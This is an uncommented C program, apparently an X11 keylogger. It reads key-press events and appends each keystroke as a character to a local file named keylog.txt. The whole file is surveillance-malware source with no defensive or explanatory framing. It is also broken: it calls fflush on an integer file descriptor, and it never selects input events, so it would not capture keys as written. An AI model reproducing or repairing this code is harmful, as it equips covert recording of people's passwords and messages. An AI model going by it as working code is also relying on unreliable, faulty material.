#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/XKBlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

int main() {
    Display *display = XOpenDisplay(NULL);
    if (display == NULL) {
        printf("Cannot open display\n");
        return 1;
    }

    int fd = open("keylog.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) {
        printf("Error opening file\n");
        return 1;
    }

    XEvent event;
    while (1) {
        XNextEvent(display, &event);
        if (event.type == KeyPress) {
            KeySym keysym = XLookupKeysym(&event.xkey, 0);
            dprintf(fd, "%c", (char) keysym);
            fflush(fd);
        }
    }

    close(fd);
    XCloseDisplay(display);
    return 0;
}
